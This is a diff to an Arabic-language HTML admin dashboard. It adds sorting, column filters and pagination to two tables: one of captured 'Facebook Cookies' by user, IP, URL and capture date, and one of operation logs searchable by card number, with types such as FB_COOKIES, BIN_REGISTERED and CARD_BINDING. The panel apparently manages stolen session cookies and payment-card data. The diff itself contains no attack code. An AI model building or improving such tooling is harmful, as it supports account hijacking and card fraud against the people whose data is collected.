@@ -285,10 +285,11 @@
             <section id="section-cookies" class="section" style="display:none;">
                 <div class="section-header">
                     <h2>🍪 Facebook Cookies</h2>
-                    <div class="filter-group" style="display: flex; gap: 10px; flex-wrap: wrap;">
-                        <input type="text" id="cookies-search" placeholder="بحث بالمستخدم أو IP..."
+                    <div class="filter-group" style="display: flex; gap: 10px; flex-wrap: wrap; align-items: center;">
+                        <input type="text" id="cookies-search" placeholder="🔍 بحث بالمستخدم أو IP..."
                             style="min-width: 200px;">
                         <button id="refresh-cookies" class="btn btn-sm btn-primary">🔄 تحديث</button>
+                        <button class="clear-filters-btn" onclick="clearFilters('cookies')">🗑️ مسح الفلاتر</button>
                     </div>
                 </div>
 
@@ -308,17 +309,36 @@
                     </div>
                 </div>
 
-                <div class="card">
+                <div class="card" style="padding: 0; overflow: hidden;">
                     <div class="table-container">
-                        <table id="cookies-table">
+                        <table id="cookies-table" class="gsheet-table">
                             <thead>
+                                <!-- Header Row with Sortable Columns -->
                                 <tr>
-                                    <th style="width: 120px;">المستخدم</th>
-                                    <th style="width: 120px;">IP</th>
-                                    <th style="width: 200px;">URL</th>
-                                    <th style="width: 100px;">طول الكوكيز</th>
-                                    <th style="width: 150px;">تاريخ الالتقاط</th>
+                                    <th class="sortable" onclick="toggleSort('cookies', 'userId')" data-column="userId"
+                                        style="width: 120px;">المستخدم</th>
+                                    <th class="sortable" onclick="toggleSort('cookies', 'ip')" data-column="ip"
+                                        style="width: 120px;">IP</th>
+                                    <th class="sortable" onclick="toggleSort('cookies', 'url')" data-column="url"
+                                        style="width: 200px;">URL</th>
+                                    <th class="sortable" onclick="toggleSort('cookies', 'cookiesLength')"
+                                        data-column="cookiesLength" style="width: 100px;">طول الكوكيز</th>
+                                    <th class="sortable sorted-desc" onclick="toggleSort('cookies', 'capturedAt')"
+                                        data-column="capturedAt" style="width: 150px;">تاريخ الالتقاط</th>
                                     <th style="width: 150px;">الإجراءات</th>
+                                </tr>
+                                <!-- Filter Row -->
+                                <tr class="filter-row">
+                                    <th><input type="text" class="column-filter" placeholder="فلتر..."
+                                            oninput="updateFilter('cookies', 'userId', this.value)"></th>
+                                    <th><input type="text" class="column-filter" placeholder="فلتر IP..."
+                                            oninput="updateFilter('cookies', 'ip', this.value)"></th>
+                                    <th><input type="text" class="column-filter" placeholder="فلتر URL..."
+                                            oninput="updateFilter('cookies', 'url', this.value)"></th>
+                                    <th></th>
+                                    <th><input type="date" class="date-input"
+                                            onchange="updateFilter('cookies', 'dateFrom', this.value)"></th>
+                                    <th></th>
                                 </tr>
                             </thead>
                             <tbody id="cookies-tbody">
@@ -328,6 +348,9 @@
                             </tbody>
                         </table>
                     </div>
+
+                    <!-- Enhanced Pagination (will be injected by JS) -->
+                    <div id="cookies-pagination-container"></div>
                 </div>
             </section>
 
@@ -359,15 +382,17 @@
             <section id="section-logs" class="section" style="display:none;">
                 <div class="section-header">
                     <h2>سجلات العمليات</h2>
-                    <div class="filter-group" style="display: flex; gap: 10px; flex-wrap: wrap;">
-                        <input type="text" id="card-search" placeholder="بحث برقم البطاقة (مثال: 4534 أو xxxx4534xx)"
-                            style="min-width: 250px;">
+                    <div class="filter-group" style="display: flex; gap: 10px; flex-wrap: wrap; align-items: center;">
+                        <input type="text" id="card-search" placeholder="🔍 بحث برقم البطاقة..."
+                            style="min-width: 200px;">
                         <select id="log-type-filter">
                             <option value="">جميع الأنواع</option>
                             <option value="BIN_REGISTERED">BIN_REGISTERED</option>
                             <option value="FB_COOKIES">FB_COOKIES</option>
                             <option value="CARD_ADDED">CARD_ADDED</option>
+                            <option value="CARD_BINDING">CARD_BINDING</option>
                         </select>
+                        <button class="clear-filters-btn" onclick="clearFilters('logs')">🗑️ مسح الفلاتر</button>
                     </div>
                 </div>
 
@@ -379,17 +404,59 @@
                     </div>
                 </div>
 
-
-                <div class="card">
+                <div class="card" style="padding: 0; overflow: hidden;">
                     <div class="table-container">
-                        <table id="logs-table">
+                        <table id="logs-table" class="gsheet-table">
                             <thead>
+                                <!-- Header Row with Sortable Columns -->
                                 <tr>
-                                    <th>المستخدم</th>
-                                    <th>النوع</th>
-                                    <th>IP</th>
-                                    <th>البيانات</th>
-                                    <th>التاريخ</th>
+                                    <th class="sortable" onclick="toggleSort('logs', 'userId')" data-column="userId">
+                                        المستخدم
+                                    </th>
+                                    <th class="sortable" onclick="toggleSort('logs', 'type')" data-column="type">
+                                        النوع
+                                    </th>
+                                    <th class="sortable" onclick="toggleSort('logs', 'ip')" data-column="ip">
+                                        IP
+                                    </th>
+                                    <th data-column="data">
+                                        البيانات
+                                    </th>
+                                    <th class="sortable sorted-desc" onclick="toggleSort('logs', 'createdAt')"
+                                        data-column="createdAt">
+                                        التاريخ
+                                    </th>
+                                </tr>
+                                <!-- Filter Row -->
+                                <tr class="filter-row">
+                                    <th>
+                                        <input type="text" class="column-filter" placeholder="فلتر..."
+                                            oninput="updateFilter('logs', 'userId', this.value)">
+                                    </th>
+                                    <th>
+                                        <select class="column-filter"
+                                            onchange="updateFilter('logs', 'type', this.value)">
+                                            <option value="">الكل</option>
+                                            <option value="CARD_ADDED">CARD_ADDED</option>
+                                            <option value="FB_COOKIES">FB_COOKIES</option>
+                                            <option value="BIN_REGISTERED">BIN_REGISTERED</option>
+                                            <option value="CARD_BINDING">CARD_BINDING</option>
+                                        </select>
+                                    </th>
+                                    <th>
+                                        <input type="text" class="column-filter" placeholder="فلتر IP..."
+                                            oninput="updateFilter('logs', 'ip', this.value)">
+                                    </th>
+                                    <th>
+                                        <input type="text" class="column-filter" placeholder="بحث في البيانات..."
+                                            oninput="updateFilter('logs', 'data', this.value)">
+                                    </th>
+                                    <th>
+                                        <div class="date-range-container">
+                                            <input type="date" class="date-input" id="logs-date-from"
+                                                onchange="updateFilter('logs', 'dateFrom', this.value)">
+                                        </div>
+                                    </th>
                                 </tr>
                             </thead>
                             <tbody id="logs-tbody">
@@ -400,26 +467,8 @@
                         </table>
                     </div>
 
-                    <!-- Pagination Controls -->
-                    <div id="logs-pagination"
-                        style="display: flex; justify-content: space-between; align-items: center; margin-top: 15px; padding: 10px; background: rgba(255, 215, 0, 0.1); border-radius: 8px;">
-                        <div>
-                            <span id="logs-count" style="color: #FFD700; font-weight: bold;">0 سجل</span>
-                            <span style="color: #888; margin: 0 10px;">|</span>
-                            <span id="logs-page-info" style="color: #ccc;">صفحة 1</span>
-                        </div>
-                        <div style="display: flex; gap: 10px;">
-                            <button id="logs-prev" class="btn btn-sm btn-secondary" disabled>◀ السابق</button>
-                            <select id="logs-per-page"
-                                style="padding: 5px 10px; border-radius: 4px; background: #2a2a3e; color: #fff; border: 1px solid #444;">
-                                <option value="25">25 لكل صفحة</option>
-                                <option value="50" selected>50 لكل صفحة</option>
-                                <option value="100">100 لكل صفحة</option>
-                                <option value="200">200 لكل صفحة</option>
-                            </select>
-                            <button id="logs-next" class="btn btn-sm btn-secondary">التالي ▶</button>
-                        </div>
-                    </div>
+                    <!-- Enhanced Pagination (will be injected by JS) -->
+                    <div id="logs-pagination-container"></div>
                 </div>
             </section>
         </main>
